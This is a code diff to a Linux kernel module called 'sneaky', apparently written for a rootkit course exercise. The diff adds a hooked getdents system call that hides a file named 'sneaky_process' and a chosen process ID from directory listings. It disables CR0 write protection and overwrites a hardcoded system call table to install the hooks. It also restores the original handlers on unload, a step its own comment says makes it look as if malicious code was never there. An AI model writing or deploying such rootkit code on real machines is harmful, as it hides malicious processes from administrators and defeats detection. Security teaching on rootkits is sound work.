@@ -11,8 +11,10 @@
 
 #define BUFFLEN 200
 
-static int pid = -1;
-module_param(pid, int, 0);
+static char procName[100];
+static char pid[100];
+module_param_string(str, procName, 100, 0);
+module_param_string(pidstr, pid, 100, 0);
 
 struct linux_dirent {
   u64 d_ino;
@@ -21,7 +23,6 @@ struct linux_dirent {
   char d_name[BUFFLEN];
 };
 
-// static long procID = -1;
 
 //Macros for kernel functions to alter Control Register 0 (CR0)
 //This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
@@ -48,12 +49,33 @@ static unsigned long *sys_call_table = (unsigned long*)0xffffffff81a00280;
 //should expect ti find its arguments on the stack (not in registers).
 //This is used for all system calls.
 asmlinkage int (*original_call)(const char *pathname, int flags);
+asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent * dirp, unsigned int count);
 
 //Define our new sneaky version of the 'open' syscall
 asmlinkage int sneaky_sys_open(const char *pathname, int flags)
 {
   printk(KERN_INFO "Very, very Sneaky!\n");
   return original_call(pathname, flags);
+}
+
+asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent * dirp, unsigned int count) {
+  int nread = original_getdents(fd, dirp, count);
+  struct linux_dirent * d;
+  int res = nread;
+  int bpos;
+  for (bpos = 0; bpos < nread;) {
+    d = (struct linux_dirent *)((char*)dirp + bpos);
+    if (strcmp(d->d_name, "sneaky_process") == 0 || strcmp(d->d_name, pid) == 0) {
+      res = nread - d->d_reclen;
+      if (bpos + d->d_reclen != nread) {
+        memmove(d, (struct linux_dirent *)((char*)dirp + bpos + d->d_reclen), nread - bpos - d->d_reclen);
+      }
+      break;
+    }
+    bpos += d->d_reclen;
+  }
+  printk(KERN_INFO "inside sneaky getdents\n");
+  return res;
 }
 
 
@@ -64,7 +86,8 @@ static int initialize_sneaky_module(void)
 
   //See /var/log/syslog for kernel print output
   printk(KERN_INFO "Sneaky module being loaded.\n");
-  printk(KERN_INFO "pid: %d\n", pid);
+  printk(KERN_INFO "pid: %s\n", pid);
+  printk(KERN_INFO "procName: %s\n", procName);
 
   //Turn off write protection mode
   write_cr0(read_cr0() & (~0x10000));
@@ -79,6 +102,10 @@ static int initialize_sneaky_module(void)
   //table with the function address of our new code.
   original_call = (void*) * (sys_call_table + __NR_open);
   *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;
+
+  // deal with getdents
+  original_getdents = (void*) * (sys_call_table + __NR_getdents);
+  *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_sys_getdents;
 
   //Revert page to read-only
   pages_ro(page_ptr, 1);
@@ -107,6 +134,7 @@ static void exit_sneaky_module(void)
   //This is more magic! Restore the original 'open' system call
   //function address. Will look like malicious code was never there!
   *(sys_call_table + __NR_open) = (unsigned long)original_call;
+  *(sys_call_table + __NR_getdents) = (unsigned long)original_getdents;
 
   //Revert page to read-only
   pages_ro(page_ptr, 1);
